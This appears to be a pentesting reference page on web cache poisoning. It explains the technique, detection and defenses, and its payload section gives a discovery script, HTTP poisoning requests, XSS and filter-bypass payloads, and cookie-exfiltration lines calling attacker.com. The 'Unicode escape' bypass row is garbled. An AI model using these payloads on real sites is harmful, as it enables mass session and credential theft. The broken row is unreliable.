# Web Cache Poisoning

> Poisoning cached responses so other users receive attacker-controlled content. **Deep dive:** [`Troubleshooting_Guide/web_chace_poisoning.md`](../../../../Troubleshooting_Guide/web_chace_poisoning.md) · **Skill:** [`ai_framework/skills/`](../../../ai_framework/skills/README.md)

**Aliases / OWASP:** A05:2021 Misconfiguration
**Status:** complete

## What it is
Web cache poisoning is an attack where the attacker stores a harmful response in a shared cache so
that it is served to other users. The attacker gets malicious content cached under a normal URL,
turning a one-time injection into one that affects every visitor who hits that cache key.

## How it works
Caches decide what to store using a "cache key" — usually the URL plus a few headers. Any input
that influences the response but is *not* part of the key (an "unkeyed" input — e.g.
`X-Forwarded-Host`, a cookie, or an unkeyed query parameter) can be abused: the attacker sends a
request whose unkeyed input causes a malicious response, the cache stores it under the benign key,
and subsequent users requesting that same key receive the poisoned response. The injected content
is often a script source, redirect target, or reflected markup leading to XSS.

## Impact
Because the poisoned response is served to everyone using that cache key, a single request can
deliver XSS, malicious redirects, or defacement at scale — stealing sessions and credentials from
many victims, or causing widespread denial of service. Severity is typically high to critical due
to the broad, persistent blast radius.

## How to detect
- Fuzz headers (`X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Host`, `Forwarded`, etc.) and
  parameters with a unique canary; if the canary reflects in the response *and* a clean follow-up
  request also returns it, the input is unkeyed and poisons the cache.
- Watch cache-status headers (`X-Cache`, `Age`, `CF-Cache-Status`) to confirm a poisoned response
  becomes a HIT served to others; use a cache buster while probing so you don't poison live keys.
- Look for cache-key flaws: parameter cloaking (`;` delimiters) and "fat GET" body parameters that
  the cache ignores but the backend honors.

## Exploitation (summary)
Discover an unkeyed input that is reflected into the response, then craft a request that injects
malicious content (script include, redirect, or markup) and confirm it is cached via `X-Cache:
hit`. The poisoned entry is then served to every user of that cache key. Use cache busters while
testing and only poison the real key once confirmed. Full payloads and bypasses are in the
Payloads section.

## Payloads & techniques
> Distilled from field payload references — for authorized testing only.

### Attack pattern
1. Find an **unkeyed** input — a header, cookie, or parameter not part of the cache key.
2. Get that input reflected into the response (script src, attribute, JSONP callback, etc.).
3. Poison the cache with a malicious response (confirm via `X-Cache: hit`).
4. Every subsequent user of that cache key receives the poisoned response.

### Discovery
Header and parameter sweeps to find reflected, unkeyed inputs. Use Param Miner in Burp, or:

```python
import requests
TARGET = "https://target.com"

for header in ['X-Forwarded-Host', 'X-Forwarded-Scheme', 'X-Forwarded-For',
               'X-Host', 'X-Original-URL', 'X-Rewrite-URL', 'Forwarded', 'True-Client-IP']:
    if 'canary-12345' in requests.get(TARGET, headers={header: 'canary-12345'}).text:
        print(f"[+] {header} reflected")
        if 'canary-12345' in requests.get(TARGET).text:
            print(f"[!] VULNERABLE: {header} poisons the cache")

for param in ['utm_content', 'utm_source', 'utm_campaign', 'callback', 'jsonp', 'debug', 'lang']:
    val = f"test_{param}_12345"
    if val in requests.get(f"{TARGET}?{param}={val}").text and val in requests.get(TARGET).text:
        print(f"[!] VULNERABLE: {param} is UNKEYED")
```

Headers worth fuzzing: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Forwarded-For`, `X-Host`, `X-Original-URL`, `X-Rewrite-URL`, `Forwarded`, `True-Client-IP`, `CF-Connecting-IP`, `X-Real-IP`. Common unkeyed params: `utm_content`, `utm_source`, `utm_campaign`, `utm_medium`, `callback`, `jsonp`, `debug`, `test`, `lang`, `locale`, `redirect`, `return_url`.

### Unkeyed-header poisoning
A reflected `X-Forwarded-Host` lets you point a script include at your server.

```http
GET / HTTP/1.1
Host: vulnerable-site.com
X-Forwarded-Host: exploit-server.net
```

The page then loads `<script src="//exploit-server.net/resources/js/tracking.js"></script>`; host `alert(document.cookie);` there and wait for `X-Cache: hit`.

Chaining two headers to poison a redirect target:

```http
GET /resources/js/tracking.js HTTP/1.1
Host: vulnerable-site.com
X-Forwarded-Scheme: http
X-Forwarded-Host: exploit-server.net
```

`X-Forwarded-Scheme: http` (not-https) triggers a 302 whose `Location` is controlled by `X-Forwarded-Host`. An unknown header found via Param Miner (e.g. `X-Host`) behaves the same; if the response carries `Vary: User-Agent`, leak the victim's exact UA first and replay it so the poisoned entry is served to them.

### Unkeyed cookie poisoning
A reflected cookie value breaks out of a JS string. Use a cache buster (`?cb=`) while testing, then remove it.

```http
GET /?cb=123 HTTP/1.1
Host: vulnerable-site.com
Cookie: fehost=prod"-alert(1)-"prod
```

Reflected as `var config = {"host": "prod"-alert(1)-"prod"};`.

### Unkeyed query-string / parameter poisoning
A reflected parameter breaks out of an attribute (often `<link rel="canonical">`). Use a non-keyed header like `Origin` as the test-time cache buster.

```http
GET /?evil='/><script>alert(1)</script> HTTP/1.1
Host: vulnerable-site.com
Origin: cache-buster-value
```

```html
<link rel="canonical" href="/?evil='/><script>alert(1)</script>"/>
```

The same works through a discovered unkeyed parameter such as `utm_content`:

```http
GET /?utm_content='/><script>alert(1)</script> HTTP/1.1
Host: vulnerable-site.com
```

Other useful query-string sinks:

```http
GET /?q=http://evil.com HTTP/1.1        # meta-refresh redirect
GET /?q=//evil.com HTTP/1.1             # open redirect
GET /?q=javascript:alert(1) HTTP/1.1    # DOM XSS sink
```

### Cache-key flaws (cloaking, fat GET)
Get the cache to key on a benign value while the backend acts on a malicious one.

Parameter cloaking with a `;` delimiter — the cache treats it as one param, the backend splits and the second `callback` wins:

```http
GET /js/geolocate.js?callback=setCountryCookie&utm_content=x;callback=alert(1) HTTP/1.1
Host: vulnerable-site.com
```

Fat GET — body parameter overrides the query param, but the cache key ignores the body:

```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
Host: vulnerable-site.com
Content-Length: 23

callback=alert(1)
```

Both yield `alert(1)({"country": "UK"})`.

JSONP callback variants:

```javascript
callback=alert(1)                          // alert(1)({...})
callback=eval(atob('YWxlcnQoMSk='))        // eval(atob('alert(1)'))({...})
callback=alert;alert(1)                    // no-parens chaining
```

### DOM-based / multi-stage poisoning
When the page fetches JSON whose URL is built from an unkeyed header, poison the cache to point at attacker JSON.

```http
GET / HTTP/1.1
Host: vulnerable-site.com
X-Forwarded-Host: exploit-server.net
```

```json
{ "country": "<img src=1 onerror=alert(document.cookie) />" }
```

Multi-stage: target a localized variant (keyed on `Cookie: lang=es`) and poison its translation feed:

```http
GET /?localized=1 HTTP/1.1
Host: vulnerable-site.com
Cookie: lang=es
X-Forwarded-Host: exploit-server.net
```

```json
{ "es": { "translations": { "View details": "</a><img src=1 onerror='alert(document.cookie)' />" } } }
```

### XSS payloads & filter bypass
Injection bodies once a reflection point is confirmed:

```html
<img src=1 onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<script>alert(1)</script>
<script>/*">*/alert(1)/*"</script>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

Exfiltration once code runs in victims' browsers:

```html
<script>fetch('https://attacker.com/log?c=' + encodeURIComponent(document.cookie));</script>
<script>document.location = 'https://attacker.com/steal?c=' + encodeURIComponent(document.cookie);</script>
```

| Filter bypass | Payload |
|---------------|---------|
| Case obfuscation | `<iMg sRc=1 oNeRrOr=alert(1)>` |
| HTML entity for `=` | `<img src=1 onerror&#x3D;alert(1)>` |
| Null byte | `<img src=1 onerror\x00=alert(1)>` |
| Tab between attr and `=` | `<img src=1 onerror\t=alert(1)>` |
| Newline | `<img src=1 onerror\n=alert(1)>` |
| Unicode escape | `<img src=1 onerroralert(1)>` |

## Defenses
1. Include every input that affects the response in the cache key, or strip/normalize unkeyed
   inputs (headers, cookies, parameters) before they reach the application.
2. Disable support for the forwarding/override headers you don't actually need
   (`X-Forwarded-Host`, `X-Original-URL`, `X-Rewrite-URL`, etc.) at the cache and origin.
3. Mark genuinely dynamic or user-influenced responses as uncacheable (`Cache-Control: no-store`).
4. Resolve cache-key vs. backend parsing differences — handle parameter delimiters and request
   bodies consistently so "parameter cloaking" and "fat GET" can't desync the key.
5. Avoid reflecting request inputs into cached responses; if unavoidable, encode them contextually
   so a poisoned value can't become executable markup.

## Finding CVEs from scratch
- **NVD** — https://nvd.nist.gov/vuln/search?query=Web+Cache+Poisoning
- **CVE.org** — https://www.cve.org/CVERecord/SearchResults?query=Web+Cache+Poisoning
- **Exploit-DB** — https://www.exploit-db.com/search?q=Web+Cache+Poisoning
- **GitHub Advisories** — https://github.com/advisories?query=Web+Cache+Poisoning
- **OSV** — https://osv.dev/list?q=Web+Cache+Poisoning
- **Community** — r/netsec, vendor security blogs, HackerOne Hacktivity, X/Twitter infosec.
- _Query tip: add the target product + version, e.g. `Web Cache Poisoning <product> <version>`._

## Notable CVEs
_Illustrative — verify against NVD before relying on details._
- `CVE-2021-23336` — Python `urllib.parse` parameter-cloaking issue (semicolon as a separator)
  that enabled web cache poisoning / parameter smuggling.
- _Canonical research: James Kettle's "Practical Web Cache Poisoning" (2018) and "Web Cache
  Entanglement" (2020) document the defining real-world unkeyed-input and cache-key techniques,
  including poisoning of major sites via `X-Forwarded-Host` and similar headers._
- _Many concrete cases are reported per-product/CDN via bug bounties; search NVD and GitHub
  Advisories with the product name plus "cache poisoning" for verified IDs._

## References
- PortSwigger Web Security Academy — Web cache poisoning: https://portswigger.net/web-security/web-cache-poisoning
- OWASP — Cache Poisoning (community attack page): https://owasp.org/www-community/attacks/Cache_Poisoning
- RFC 9111 — HTTP Caching (cache keys, cacheability, and `Vary`).
